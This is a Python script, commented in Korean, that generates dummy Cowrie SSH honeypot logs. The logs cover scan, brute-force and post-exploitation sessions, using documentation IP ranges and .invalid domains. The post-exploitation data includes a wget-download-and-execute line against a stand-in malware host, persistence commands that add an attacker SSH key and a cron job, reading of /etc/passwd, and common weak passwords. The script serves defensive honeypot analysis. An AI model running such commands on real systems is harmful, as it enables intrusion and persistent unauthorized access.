"""
Cowrie JSON 로그 형식의 더미 데이터 생성기.

- 시나리오: scan(접속 후 이탈) / bruteforce(로그인 반복 실패) / post_exploit(로그인 성공 + 명령 실행)
- IP: 문서용 대역(RFC 5737)만 사용 → 실제 IP와 겹치지 않음
- 다운로드 URL: .invalid 도메인(RFC 2606) → 실제로 접속 불가
- 출력: JSON Lines (Cowrie cowrie.json과 동일하게 1줄 1이벤트)

사용:
    python scripts/gen_dummy.py --sessions 200 --seed 42 --out data/dummy/cowrie.json

    (10/30) python scripts/gen_dummy.py --sessions 200 --seed 42 --date 2026-10-29
"""
from __future__ import annotations

import argparse
import hashlib
import ipaddress
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

SENSOR = "honeyintel-dummy"
DST_IP = "10.0.1.4"  # 허니팟 VM 사설 IP 가정

DOC_NETS = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]

CLIENT_VERSIONS = [
    "SSH-2.0-libssh2_1.9.0",
    "SSH-2.0-Go",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-PuTTY_Release_0.78",
    "SSH-2.0-paramiko_3.4.0",
]
USERNAMES = ["root", "admin", "ubuntu", "user", "test", "oracle", "pi", "postgres", "git", "support"]
PASSWORDS = ["123456", "password", "admin", "root", "1234", "12345678", "qwerty", "admin123", "P@ssw0rd", "ubuntu"]

RECON_CMDS = [
    "uname -a",
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem",
    "whoami",
    "ls -la /tmp",
    "cat /etc/passwd",
    "crontab -l",
    "nproc",
]
PERSIST_CMDS = [
    "echo 'ssh-rsa AAAAB3NzaDUMMYKEY attacker@dummy' >> ~/.ssh/authorized_keys",
    "chattr -ia ~/.ssh/authorized_keys",
    "(crontab -l; echo '*/5 * * * * /tmp/.x/run') | crontab -",
]


def ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"


class Generator:
    def __init__(self, seed: int, start: datetime):
        self.rnd = random.Random(seed)
        self.start = start
        # 공격 IP 풀: 일부 IP가 여러 세션을 만들도록 (실제 봇 패턴)
        self.ip_pool = [self._doc_ip() for _ in range(40)]

    def _doc_ip(self) -> str:
        net = self.rnd.choice(DOC_NETS)
        return str(net.network_address + self.rnd.randint(1, 254))

    def _session_id(self) -> str:
        return uuid.UUID(int=self.rnd.getrandbits(128)).hex[:12]

    def _hassh(self, version: str) -> str:
        return hashlib.md5(version.encode()).hexdigest()

    def _base(self, eventid: str, sid: str, ip: str, port: int, dt: datetime) -> dict:
        return {
            "eventid": eventid,
            "session": sid,
            "src_ip": ip,
            "src_port": port,
            "dst_ip": DST_IP,
            "dst_port": 22,
            "sensor": SENSOR,
            "timestamp": ts(dt),
        }

    def session(self, scenario: str) -> list[dict]:
        sid = self._session_id()
        ip = self.rnd.choice(self.ip_pool)
        port = self.rnd.randint(30000, 65000)
        dt = self.start + timedelta(seconds=self.rnd.randint(0, 86400 - 600))
        t0 = dt
        version = self.rnd.choice(CLIENT_VERSIONS)
        ev: list[dict] = []

        def add(eventid: str, gap: float, **fields):
            nonlocal dt
            dt += timedelta(seconds=gap)
            e = self._base(eventid, sid, ip, port, dt)
            e.update(fields)
            ev.append(e)

        add("cowrie.session.connect", 0, protocol="ssh",
            message=f"New connection: {ip}:{port} ({DST_IP}:22) [session: {sid}]")
        add("cowrie.client.version", 0.2, version=version,
            message=f"Remote SSH version: {version}")
        add("cowrie.client.kex", 0.1, hassh=self._hassh(version),
            message="SSH client hassh fingerprint")

        if scenario == "bruteforce":
            for _ in range(self.rnd.randint(5, 40)):
                u, p = self.rnd.choice(USERNAMES), self.rnd.choice(PASSWORDS)
                add("cowrie.login.failed", self.rnd.uniform(0.3, 2.0), username=u, password=p,
                    message=f"login attempt [{u}/{p}] failed")

        elif scenario == "post_exploit":
            for _ in range(self.rnd.randint(0, 3)):
                u, p = self.rnd.choice(USERNAMES), self.rnd.choice(PASSWORDS)
                add("cowrie.login.failed", self.rnd.uniform(0.3, 2.0), username=u, password=p,
                    message=f"login attempt [{u}/{p}] failed")
            add("cowrie.login.success", 0.5, username="root", password="admin",
                message="login attempt [root/admin] succeeded")
            cmds = self.rnd.sample(RECON_CMDS, self.rnd.randint(2, 5))
            if self.rnd.random() < 0.5:
                cmds.append(self.rnd.choice(PERSIST_CMDS))
            for c in cmds:
                add("cowrie.command.input", self.rnd.uniform(0.5, 3.0), input=c, message=f"CMD: {c}")
            if self.rnd.random() < 0.6:
                name = self.rnd.choice(["bot.sh", "x86", "mips", "kinsing"])
                url = f"http://malware-{self.rnd.randint(1, 9)}.dummy.invalid/{name}"
                cmd = f"cd /tmp && wget {url} && chmod +x {name} && ./{name}"
                add("cowrie.command.input", 1.0, input=cmd, message=f"CMD: {cmd}")
                sha = hashlib.sha256(f"{url}-{self.rnd.random()}".encode()).hexdigest()
                add("cowrie.session.file_download", 2.0, url=url, shasum=sha,
                    outfile=f"var/lib/cowrie/downloads/{sha}",
                    message=f"Downloaded URL ({url}) with SHA-256 {sha}")

        # scan: 배너만 확인하고 종료 (추가 이벤트 없음)

        add("cowrie.session.closed", self.rnd.uniform(0.2, 1.5),
            duration=f"{(dt - t0).total_seconds():.1f}",
            message="Connection lost")
        return ev


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sessions", type=int, default=200)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--date", default=None, help="UTC 날짜 YYYY-MM-DD (기본: 어제)")
    ap.add_argument("--out", default="data/dummy/cowrie.json")
    args = ap.parse_args()

    if args.date:
        start = datetime.strptime(args.date, "%Y-%m-%d").replace(tzinfo=timezone.utc)
    else:
        today = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        start = today - timedelta(days=1)

    gen = Generator(args.seed, start)
    # 실제 허니팟 분포에 가깝게: 스캔·무차별대입이 대부분, 침입후행위는 소수
    weights = {"scan": 0.45, "bruteforce": 0.45, "post_exploit": 0.10}

    events: list[dict] = []
    counts = {k: 0 for k in weights}
    for _ in range(args.sessions):
        sc = gen.rnd.choices(list(weights), weights=list(weights.values()))[0]
        counts[sc] += 1
        events.extend(gen.session(sc))

    events.sort(key=lambda e: e["timestamp"])  # Cowrie 로그처럼 시간순 섞임

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")

    print(f"sessions={args.sessions} events={len(events)} {counts} -> {out}")


if __name__ == "__main__":
    main()